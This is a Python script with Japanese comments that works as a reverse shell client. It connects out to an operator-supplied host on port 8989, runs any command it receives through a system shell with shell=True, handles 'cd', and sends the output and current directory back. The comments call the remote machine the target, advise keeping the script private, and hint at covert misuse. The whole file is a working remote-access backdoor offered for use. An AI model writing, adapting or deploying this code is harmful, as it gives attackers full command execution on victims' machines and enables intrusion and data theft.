#author: Johnjimy Som
#date: 2018年8月24日
#version: 2.0.0
#description: このスクリプトは自分で保管してください。
#このスクリプトはサーバーに接続し、指示を待ちます。

import os #Operating System にアクセスする
import socket #サーバーに接続する
import subprocess #ターゲットマシンのオペレーティングシステムを制御することができます

s = socket.socket()#コンピュータは他のコンピュータに接続できます。
host = '192.1XX.X.XXX'#<-- ターゲットサーバのIPを入れてください 例:"192.3.3.333"
port = 8989
s.connect((host,port))#ネットワークをバインドする

while True:
    data = s.recv(1024) #1024 buffer size
    if data[:2].decode("utf-8") == 'cd': #byteを文字列に変換する
        os.chdir(data[3:].decode("utf-8"))#OS (Operating System) = オペレーティングシステムにアクセスする
    if len(data) > 0:
        #cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,  stderr=subprocess.PIPE,  stdin=subprocess.PIPE)#debugg
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,  stderr=subprocess.PIPE,  stdin=subprocess.PIPE)
        #サブプロセッサを開く、ターミナルからcmdを開く（シェルは追加しないでください）<--（オプション）"shell=True" がいらない
        #コンピュータからの任意の出力バイトを取り、標準文字列に出力します。
        output_bytes=cmd.stdout.read()+cmd.stderr.read()
        #output_bytes = cmd.stdout.read()+cmd.strderr.read() #debugg
    output_str = str(output_bytes, "utf-8")
    s.send(str.encode(output_str + str(os.getcwd())  + ">"))#gwd = get current directory
    #print(output_str) #お前が悪いことをしているなら、これを使わないでください

#   クローズ接続
s.close()